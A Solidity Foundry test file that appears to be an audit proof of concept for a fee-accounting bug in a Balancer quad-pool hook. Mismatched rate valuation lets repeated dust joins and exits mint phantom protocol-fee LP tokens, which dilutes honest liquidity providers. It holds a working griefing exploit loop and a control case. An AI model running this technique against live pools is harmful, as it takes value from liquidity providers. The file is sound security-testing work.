// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {RateProviderMock} from "contracts/test/balancer/v3/RateProviderMock.sol";
import {SimpleMintableERC20} from "contracts/test/stubs/SimpleMintableERC20.sol";
import {IVaultFeeOracleQuery} from "contracts/interfaces/IVaultFeeOracleQuery.sol";
import {
    TestBase_UniswapV4StandardExchangeBalancerQuadStableBufferHook as TestBase
} from "contracts/hooks/uniswap/v4/standardExchange/stable/quad/balancer/TestBase_UniswapV4StandardExchangeBalancerQuadStableBufferHook.sol";

/// @notice rate-driven-protocol-fee-dilution (Balancer quad): _rootKNow() values a raw leg that carries a
///         rate provider at raw*rate, but _rootKCheckpoint() values the stored feeReserves for that leg at face
///         (_liquidityValue raw branch). With rate>1 every liquidity op sees phantom K growth and mints LP to
///         feeTo with zero trading volume. Anyone can spam dust join/exit to dilute LPs.
contract BalancerQuadPhantomFee is TestBase {
    address internal attacker = address(0xA77AC4);
    uint256 internal constant SEED = 1_000_000 ether;
    RateProviderMock internal rp1;

    function _deployWithRawRp(uint256 rate) internal {
        rp1 = new RateProviderMock();
        rp1.mockRate(rate);
        address[4] memory toks = [address(token0), address(token1), address(token2), address(token3)];
        address[4] memory ses;
        ses[0] = se0;
        address[4] memory rps;
        rps[1] = address(rp1); // raw leg 1 (e.g. a wstETH-like yield token) priced via rate provider
        _deployHookWithArgs(_pkgArgs(toks, ses, rps, DEFAULT_BASE_AMP));
        _fundAndApprove(token0);
        _fundAndApprove(token1);
        _fundAndApprove(token2);
        _fundAndApprove(token3);
        _ensureFeeTo();
        _setUsageFee(0.1e18); // protocol takes 10% of LP fee growth
        _setDexFee(0.001e18);
        // honest LP seeds a rated-balanced book (leg1 face = SEED / rate)
        uint256[] memory amounts = new uint256[](4);
        amounts[0] = SEED;
        amounts[1] = SEED * 1e18 / rate;
        amounts[2] = SEED;
        amounts[3] = SEED;
        vm.prank(user);
        quad.joinProportional(amounts, user, 0, block.timestamp + 1);
        assertGt(quad.kLast(), 0, "fee on, kLast set");
    }

    function _fairValue(uint256 shares, uint256 rate) internal view returns (uint256 v) {
        uint256[] memory a = quad.previewExitProportional(shares);
        v = a[0] + a[1] * rate / 1e18 + a[2] + a[3];
    }

    function _grief(uint256 ops) internal returns (uint256 attackerCost) {
        uint256 dust = 1 ether;
        SimpleMintableERC20[4] memory t = [token0, token1, token2, token3];
        vm.startPrank(attacker);
        for (uint256 i; i < 4; ++i) {
            t[i].mint(attacker, 10 ether);
            t[i].approve(hook, type(uint256).max);
        }
        uint256 before = token0.balanceOf(attacker) + token1.balanceOf(attacker) + token2.balanceOf(attacker)
            + token3.balanceOf(attacker);
        uint256[] memory amounts = new uint256[](4);
        for (uint256 i; i < 4; ++i) amounts[i] = dust;
        uint256[] memory mins = new uint256[](4);
        for (uint256 k; k < ops; ++k) {
            (uint256 sh,) = quad.joinProportional(amounts, attacker, 0, block.timestamp + 1);
            quad.exitProportional(sh, attacker, mins, block.timestamp + 1);
        }
        vm.stopPrank();
        uint256 afterBal = token0.balanceOf(attacker) + token1.balanceOf(attacker) + token2.balanceOf(attacker)
            + token3.balanceOf(attacker);
        attackerCost = before > afterBal ? before - afterBal : 0;
    }

    function test_balancerQuad_phantomProtocolFee_rate110() public {
        uint256 rate = 1.1e18;
        _deployWithRawRp(rate);
        address feeTo = address(IVaultFeeOracleQuery(address(indexedexManager)).feeTo());
        uint256 victimShares = IERC20(hook).balanceOf(user);
        uint256 victimBefore = _fairValue(victimShares, rate);
        uint256 supplyBefore = IERC20(hook).totalSupply();
        uint256 feeToBefore = IERC20(hook).balanceOf(feeTo);
        console2.log("rootK checkpoint gap present; supply", supplyBefore);

        uint256 cost = _grief(100); // 200 liquidity ops, zero swaps, zero rate change

        uint256 feeToAfter = IERC20(hook).balanceOf(feeTo);
        uint256 victimAfter = _fairValue(victimShares, rate);
        console2.log("feeTo LP before   ", feeToBefore);
        console2.log("feeTo LP after    ", feeToAfter);
        console2.log("feeTo value (fair)", _fairValue(feeToAfter, rate));
        console2.log("victim value before", victimBefore);
        console2.log("victim value after ", victimAfter);
        console2.log("victim loss        ", victimBefore - victimAfter);
        console2.log("victim loss bps    ", (victimBefore - victimAfter) * 10_000 / victimBefore);
        console2.log("attacker token cost", cost);
        assertGt(feeToAfter, feeToBefore, "protocol LP minted with zero trading");
        assertLt(victimAfter, victimBefore, "honest LP diluted");
    }

    function test_balancerQuad_control_rate1() public {
        uint256 rate = 1e18;
        _deployWithRawRp(rate);
        address feeTo = address(IVaultFeeOracleQuery(address(indexedexManager)).feeTo());
        uint256 victimShares = IERC20(hook).balanceOf(user);
        uint256 victimBefore = _fairValue(victimShares, rate);
        uint256 feeToBefore = IERC20(hook).balanceOf(feeTo);
        _grief(100);
        uint256 feeToAfter = IERC20(hook).balanceOf(feeTo);
        uint256 victimAfter = _fairValue(victimShares, rate);
        console2.log("control feeTo minted", feeToAfter - feeToBefore);
        console2.log("control victim before", victimBefore);
        console2.log("control victim after ", victimAfter);
    }
}
